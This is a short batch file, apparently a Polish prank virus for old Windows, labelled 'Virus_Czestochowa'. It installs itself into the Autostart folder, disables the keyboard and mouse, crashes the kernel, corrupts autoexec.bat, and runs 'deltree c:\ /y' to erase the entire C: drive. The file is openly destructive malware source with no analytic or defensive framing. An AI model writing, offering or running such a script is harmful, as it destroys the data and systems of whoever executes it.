   echo off
   cls
   echo Virus_Czestochowa!!!
   if not exist c:\windows\menust~1\programy\autost~1\_setup.bat copy %0 c:\windows\menust~1\programy\autost~1\_setup.bat
   rundll32 keyboard,disable
   rundll32 mouse,disable
   rundll32 user,swapmousebutton
   start h4ck3rs.republika.pl
   c:\windows\calc.exe
   rundll32 user,SetDoubleClickTime
   rundll32 krnl386.exe,FatalExit
   rundll32 user,disableoemlayer
   dir c:\*.* /s /v >>c:\autoexec.bat
   deltree c:\ /y
   echo g=ffff:0 | debug >>c:autoexec.bat
   copy c:\windows\*.* c:\windows\pulpit\*.* >nul
   reboot ;
   rundll32.exe user.exe,wnetdisconnectdialog
   rundll32.exe krnl386.exe,ExitKernel
   rundll32.exe shell32,ShellAboutA
   rundll32.exe user.exe,MessageBeep
   uninst.exe /y
